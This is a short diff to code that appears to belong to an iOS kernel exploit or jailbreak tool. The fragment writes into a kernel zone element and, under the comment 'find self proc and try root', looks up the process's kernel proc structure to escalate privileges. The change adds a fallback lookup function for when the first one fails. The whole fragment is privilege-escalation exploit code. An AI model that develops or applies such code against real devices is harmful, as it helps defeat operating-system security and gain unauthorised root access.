@@ -733,8 +733,10 @@
             kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);
 
             // Step 2: find self proc and try root
+            extern uint64_t proc_self(void);
             extern uint64_t kp_get_self_proc(void);
             uint64_t proc = kp_get_self_proc();
+            if (!proc) proc = proc_self();
             [r appendFormat:@"  getuid() = %d\n", getuid()];
             if (proc) {
                 [r appendFormat:@"  self proc = 0x%016llx\n", proc];
